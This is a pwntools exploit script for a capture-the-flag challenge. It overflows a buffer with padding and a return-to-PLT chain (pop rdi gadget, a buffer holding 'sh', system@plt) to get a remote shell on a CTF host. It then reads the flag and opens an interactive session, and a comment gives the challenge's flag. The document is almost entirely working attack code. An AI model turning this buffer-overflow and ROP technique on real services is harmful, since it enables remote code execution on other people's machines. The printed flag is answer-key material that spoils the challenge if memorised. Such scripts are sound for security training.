#!/usr/bin/env python
from pwn import *

# BreakAllCTF{Return_to_plt_is_p0werful:D}

e = ELF( '../../../binary/baby/plt' )

host , port = 'ctf.yuawn.idv.tw' , 10404
y = remote( host , port )

name = 0x601070
pop_rdi = 0x400773

y.sendafter( '?' , 'sh\x00' )

y.sendafter( '?' , 'a' * 0x38 + p64( pop_rdi ) + p64( name ) + p64( e.plt['system'] ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()